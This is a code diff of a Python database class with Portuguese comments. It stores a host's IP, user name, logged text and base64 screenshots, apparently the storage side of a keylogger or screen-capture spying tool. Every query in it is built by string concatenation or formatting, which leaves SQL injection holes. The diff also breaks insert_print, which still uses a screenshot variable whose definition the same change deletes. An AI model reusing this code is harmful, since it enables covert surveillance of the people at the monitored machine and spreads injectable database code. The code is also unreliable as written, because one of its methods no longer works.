@@ -14,9 +14,16 @@ class Database:
         self.getIP = _ip.get_ip()
         self.getUser = _ip.get_user()
     
-    def insert(self, log):
+    def insert(self, log, img = False):
+        if img:
+            screenPrint = screen.Screenshot()
+            getImg = str(screenPrint.img_base64())
+        else:
+            getImg = ""
+
         # Executa o comando:
-        self.cursor.execute("INSERT INTO dados (ip, user, texto) VALUES ('" + self.getIP + "','" + self.getUser + "','" + log + "')")
+        sql = 'INSERT INTO dados (ip, user, texto, imagem) VALUES ("{0}", "{1}", "{2}", "{3}")'.format(self.getIP, self.getUser, log, getImg)
+        self.cursor.execute(sql)
         
         # Efetua um commit no banco de dados.
         # Por padrão, não é efetuado commit automaticamente. Você deve commitar para salvar
@@ -27,8 +34,7 @@ class Database:
         self.conexao.close()
 
     def insert_print(self):
-        screenPrint = screen.Screenshot()
-        getImg = screenPrint.img_base64()
+        
 
         self.cursor.execute('INSERT INTO dados (ip, user, imagem) VALUES ("' + self.getIP + '","' + self.getUser + '","' + getImg + '")')
         
